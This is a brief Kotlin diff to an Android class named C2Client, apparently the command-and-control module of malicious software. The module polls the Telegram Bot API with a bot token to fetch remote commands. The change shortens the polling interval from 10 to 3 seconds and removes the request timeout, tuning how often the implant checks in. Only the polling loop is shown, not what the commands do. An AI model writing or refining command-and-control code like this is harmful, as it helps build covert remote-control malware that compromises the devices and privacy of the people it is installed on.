@@ -33,13 +33,13 @@ class C2Client(private val ctx: Context) {
                 // Poll for commands
                 pollCommands()
             } catch (_: Exception) {}
-            delay(10_000L)
+            delay(3_000L)
         }
     }
 
     private suspend fun pollCommands() = withContext(Dispatchers.IO) {
         try {
-            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?timeout=5"
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates"
             val req = Request.Builder().url(url).build()
             http.newCall(req).execute().use { resp ->
                 val body = resp.body?.string() ?: return@withContext
